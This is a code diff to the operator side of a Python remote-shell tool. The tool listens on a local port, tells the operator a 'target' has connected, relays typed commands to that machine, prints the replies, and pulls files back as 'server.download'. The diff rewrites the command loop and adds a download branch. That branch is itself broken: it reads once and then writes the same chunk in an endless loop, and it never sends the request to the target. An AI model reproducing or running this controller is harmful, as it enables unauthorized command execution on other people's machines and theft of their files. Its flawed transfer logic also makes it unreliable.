@@ -16,9 +16,9 @@ sock = st.socket(st.AF_INET,st.SOCK_STREAM)
 sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
 sock.bind(('127.0.0.1',7777))
 sock.listen()
-
-
 con,addr = sock.accept()
+
+# def recv_file()
 while con:
     system('clear')
     print('[*] Connection established to the target')
@@ -27,18 +27,22 @@ while con:
         cmd = input('>>>')
         if not cmd:
             continue
-
-        if cmd in ('quite','exit'):
+        elif 'download' in cmd:
+            getfiles = con.recv(4096)
+            with open('server.download','wb') as file:
+                while True:
+                    if not getfiles:
+                        break
+                    file.write(getfiles)
+                file.close()
+                
+            
+        elif cmd in ('quite','exit'):
             con.close()
+            sock.close()
             break
-        
-        con.send(cmd.encode())
-
-        output = con.recv(1168).decode()
-
-        if cmd == 'download':
-            with open('server.download','w') as file:
-                file.write(output)
-
-        print(output,end='\n',flush=True)
-        continue
+        else:
+            con.send(cmd.encode())
+            output = con.recv(1168).decode()
+            print(output,end='\n',flush=True)
+            continue
